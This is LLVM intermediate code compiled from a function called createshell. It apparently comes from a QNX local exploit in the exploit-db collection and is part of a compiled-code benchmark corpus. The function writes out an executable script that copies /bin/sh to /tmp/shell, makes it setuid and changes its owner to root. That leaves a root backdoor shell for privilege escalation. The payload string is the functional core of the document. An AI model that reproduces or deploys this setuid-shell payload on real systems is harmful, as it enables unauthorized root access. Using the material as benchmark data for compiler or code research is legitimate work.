; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/qnx/local/extr_32155.c_createshell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/qnx/local/extr_32155.c_createshell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [87 x i8] c"/bin/cp /bin/sh /tmp/shell\0A/bin/chmod 4755 /tmp/shell\0A/bin/chown root:root /tmp/shell\0A\00", align 1
@FILENAME = common dso_local global i32 0, align 4
@O_RDWR = common dso_local global i32 0, align 4
@O_CREAT = common dso_local global i32 0, align 4
@S_IRWXU = common dso_local global i32 0, align 4
@S_IXGRP = common dso_local global i32 0, align 4
@S_IXOTH = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [27 x i8] c"cannot open %s for writing\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @createshell() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  store i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str, i64 0, i64 0), i8** %2, align 8
  %3 = load i32, i32* @FILENAME, align 4
  %4 = load i32, i32* @O_RDWR, align 4
  %5 = load i32, i32* @O_CREAT, align 4
  %6 = or i32 %4, %5
  %7 = load i32, i32* @S_IRWXU, align 4
  %8 = load i32, i32* @S_IXGRP, align 4
  %9 = or i32 %7, %8
  %10 = load i32, i32* @S_IXOTH, align 4
  %11 = or i32 %9, %10
  %12 = call i32 @open(i32 %3, i32 %6, i32 %11)
  store i32 %12, i32* %1, align 4
  %13 = load i32, i32* %1, align 4
  %14 = icmp slt i32 %13, 0
  br i1 %14, label %15, label %18

15:                                               ; preds = %0
  %16 = load i32, i32* @FILENAME, align 4
  %17 = call i32 @errx(i32 1, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.1, i64 0, i64 0), i32 %16)
  br label %18

18:                                               ; preds = %15, %0
  %19 = load i32, i32* %1, align 4
  %20 = load i8*, i8** %2, align 8
  %21 = load i8*, i8** %2, align 8
  %22 = call i32 @strlen(i8* %21)
  %23 = call i32 @write(i32 %19, i8* %20, i32 %22)
  %24 = load i32, i32* %1, align 4
  %25 = call i32 @close(i32 %24)
  ret void
}

declare dso_local i32 @open(i32, i32, i32) #1

declare dso_local i32 @errx(i32, i8*, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
